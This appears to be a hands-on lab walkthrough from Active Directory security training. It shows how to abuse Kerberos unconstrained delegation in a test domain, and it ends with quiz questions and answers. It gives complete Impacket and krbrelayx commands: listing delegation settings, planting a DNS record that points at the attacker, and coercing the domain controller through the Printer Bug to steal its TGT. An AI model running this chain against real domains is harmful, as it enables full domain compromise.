#Unconstrained delegation abuse

This attack is performed by using a compromised service account that is configured to perform unconstrained delegation. Once an attacker has compromised any user account, it can query the domain's database using LDAP, in order to check which accounts are configured for delegation. This can be done by using the 'findDelegation.py' script from Impacket. You may use Jesse Pinkman's credentials, cracked in the AS-REP roasting attack.  

```
findDelegation.py POLARIS.LOCAL/jesse.pinkman:Wang0Tang0! -target-domain polaris.local
```

The output from the script tells the attacker which accounts are configured for which type of delegation. Namely, the attacker notes that the jesse.pinkman account is configured for unconstrained delegation. This means that through the use of this account, the attacker can retrieve TGTs from users that authenticate to it.

Now, the objective in this exercise is to steal the DC account's TGT. The DC account can be coerced into authenticating to the attacker's machine through the use of the Printer Bug. If the DC authenticates to the attacker machine, the attacker can then retrieve its TGT, and impersonate the DC to any service on the domain.

To properly trigger the Printer Bug and coerce the DC to authenticate to the attacker using Kerberos, there must be a DNS record that resolves the jesse.pinkman.polaris.local hostname to the attacker's IP address. This is required since if IP addresses are used to trigger authentication, Windows falls back to NTLM. To create this record, the 'dnstool.py' script from the krbrelayx toolkit can be used, since authenticated users can create  DNS records. In the 'krbrelayx' directory, run:

```
python3 dnstool.py -u polaris\\jesse.pinkman -p 'Wang0Tang0!' captain.polaris.local --zone polaris.local -r jesse.pinkman.polaris.local -a add -t A -d 192.168.122.2
```

At this point, there's a DNS record resolving Jesse's hostname to the attacker's IP address. Upon DC authentication to Jesse, the DC will query DNS and be tricked into thinking that the attacker's IP is actually Jesse's IP.

At this point, the printer bug can be executed, which will trigger Kerberos authentication from the DC to the attacker. Since the DC assesses that Jesse is configured for unconstrained delegation, it will include its own TGT within the AP-REQ sent to the attacker's machine. The attacker will then use Jesse's password to decrypt the AP-REQ section that includes a session key. This session key is necessary to use the TGT, and will also be sent to Jesse, as per unconstrained delegation behavior. Once this session key is obtained, the attacker can then use the DC's TGT arbitrarily.

To do so, in one terminal, the 'krbrelayx.py' script must be running. Once that script is running and waiting for the DC to authenticate to the attacker, the attacker will execute the printer bug in a second terminal, using the 'printerbug.py' script. The Printer Bug will coerce the DC to authenticate to the attacker's machine.

```
#In a first terminal, run the krbrelayx.py script. To be able to do so, you must stop the DNS service running on your machine
#First, stop DNS service
systemctl stop systemd-resolved 
#Now, run the krbrelayx script
sudo -E python3 krbrelayx.py -s jesse.pinkman -p Wang0Tang0!
#Now in a second terminal, run the printer bug in order to trick the DC into authenticating to the attacker using Kerberos
python3 printerbug.py POLARIS/jesse.pinkman:'Wang0Tang0!'@captain.polaris.local jesse.pinkman.polaris.local
#At this point you can restart the DNS service
systemctl start systemd-resolved 
```

At this point, the attacker has successfully retrieved the CAPTAIN DCs own TGT, which can be used to impersonate the DC to any service in the domain.


!!! question
    Why is the service's (Jesse's) password required to retrieve the DC's TGT? 

??? success "Answer"
    The service password is required since in Kerberos Unconstrained Delegation, the DC's TGT is sent to the attacker, along with a session key. This session key is encrypted using the service account's (Jesse) password. Using Jesse's password, the attacker can retrieve this session key and use it in new TGS exchanges, leveraging the own DC's TGT, and therefore impersonating the DC. 

!!! question
    Would the DC send its TGT to the attacker if constrained delegation was used, instead of unconstrained delegation?

??? success "Answer"
    The DC would not send its TGT if instead constrained delegation was used. This only happens in unconstrained delegation and is considered unsecure.

!!! question
    Which Windows service is exploited by the Printer Bug to trigger authentication from a target system?
??? success "Answer"
    The Printer Bug abuses the Windows Print Spooler service to coerce a target to authenticate to the attacker.


